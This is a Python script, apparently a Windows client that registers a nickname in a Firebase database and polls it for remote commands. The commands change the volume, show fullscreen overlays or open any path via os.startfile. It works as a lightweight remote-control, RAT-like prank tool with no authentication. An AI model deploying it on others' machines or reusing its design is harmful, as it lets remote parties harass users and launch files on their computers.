import ctypes
import json
import os
import time
import tkinter as tk
import urllib.error
import urllib.request
from PIL import Image, ImageTk


def load_db_url():
  if os.path.exists("config.json"):
    with open("config.json", "r", encoding="utf-8") as f:
      data = json.load(f)
      url = data.get("firebase_url", "").rstrip("/")
      if url:
        return url
  return "https://ratka-777f3-default-rtdb.firebaseio.com"


DB_URL = load_db_url()


def set_volume(percent):
  percent = max(0, min(100, int(percent)))
  VK_VOLUME_DOWN = 0xAE
  VK_VOLUME_UP = 0xAF
  user32 = ctypes.windll.user32
  for _ in range(55):
    user32.keybd_event(VK_VOLUME_DOWN, 0, 0, 0)
    user32.keybd_event(VK_VOLUME_DOWN, 0, 2, 0)
  steps = int(round(percent / 2))
  for _ in range(steps):
    user32.keybd_event(VK_VOLUME_UP, 0, 0, 0)
    user32.keybd_event(VK_VOLUME_UP, 0, 2, 0)


def show_overlay(text="", image_path="", duration=5):
  root = tk.Tk()
  root.overrideredirect(True)
  root.attributes("-topmost", True)
  root.configure(bg="black")

  w = root.winfo_screenwidth()
  h = root.winfo_screenheight()
  root.geometry(f"{w}x{h}+0+0")

  if image_path and os.path.exists(image_path):
    img = Image.open(image_path)
    img.thumbnail((w - 100, h - 180))
    photo = ImageTk.PhotoImage(img)
    lbl_img = tk.Label(root, image=photo, bg="black")
    lbl_img.image = photo
    lbl_img.pack(expand=True)

  if text:
    lbl_txt = tk.Label(
        root,
        text=text,
        font=("Segoe UI", 36, "bold"),
        fg="white",
        bg="black",
        wraplength=w - 120,
    )
    lbl_txt.pack(expand=True)

  root.after(int(duration * 1000), root.destroy)
  root.mainloop()


def fetch_json(path):
  url = f"{DB_URL}/{path}.json"
  req = urllib.request.Request(url, method="GET")
  with urllib.request.urlopen(req, timeout=10) as resp:
    raw = resp.read().decode("utf-8")
    return json.loads(raw) if raw and raw != "null" else None


def send_json(path, payload):
  url = f"{DB_URL}/{path}.json"
  data = json.dumps(payload).encode("utf-8")
  req = urllib.request.Request(
      url,
      data=data,
      headers={"Content-Type": "application/json"},
      method="PUT",
  )
  with urllib.request.urlopen(req, timeout=10) as resp:
    return resp.read().decode("utf-8")


def main():
  nick = input("Введи свой ник для подключения: ").strip()
  if not nick:
    print("Ник не может быть пустым.")
    return

  print(f"Подключено по нику: {nick}")
  send_json(f"clients/{nick}", {"online": True, "last_seen": int(time.time())})

  while True:
    try:
      send_json(f"clients/{nick}/last_seen", int(time.time()))
      cmd = fetch_json(f"commands/{nick}")
      if isinstance(cmd, dict) and cmd:
        action = cmd.get("action")
        if action == "volume":
          set_volume(cmd.get("value", 50))
        elif action == "overlay":
          show_overlay(
              text=cmd.get("text", ""),
              image_path=cmd.get("image_path", ""),
              duration=cmd.get("duration", 5),
          )
        elif action == "explorer":
          target = cmd.get("path", os.path.expanduser("~"))
          os.startfile(target)
        send_json(f"commands/{nick}", None)
    except urllib.error.URLError:
      pass
    except Exception as e:
      print("Ошибка цикла:", e)

    time.sleep(2)


if __name__ == "__main__":
  main()
